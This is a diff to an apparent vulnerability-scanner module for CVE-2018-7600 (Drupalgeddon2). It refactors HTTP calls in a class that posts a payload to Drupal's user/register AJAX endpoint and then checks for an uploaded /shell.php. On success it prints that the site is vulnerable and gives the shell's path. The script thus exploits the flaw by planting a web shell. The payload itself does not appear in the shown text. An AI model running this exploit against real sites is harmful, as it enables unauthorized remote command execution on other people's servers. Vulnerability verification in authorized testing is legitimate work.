@@ -6,9 +6,8 @@ description: CVE-2018-7600漏洞可执行任意命令
 '''
 
 import time
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2018_7600_BaseVerify:
     def __init__(self, url):
@@ -22,10 +21,9 @@ class CVE_2018_7600_BaseVerify:
         try:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
-            verify = True
             url = self.url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
-            r = requests.post(url,  data = self.payload, headers = self.headers, allow_redirects = False, verify = False)
-            check = requests.get(self.url + '/shell.php', headers = self.headers, allow_redirects = False, verify = False)
+            r = request.post(url,  data = self.payload, headers = self.headers)
+            check = request.get(self.url + '/shell.php', headers = self.headers)
             if check.status_code == 200:
                 print ('存在CVE-2018-7600漏洞,shell文件路径为：'+ self.url +'/shell.php')
                 return True
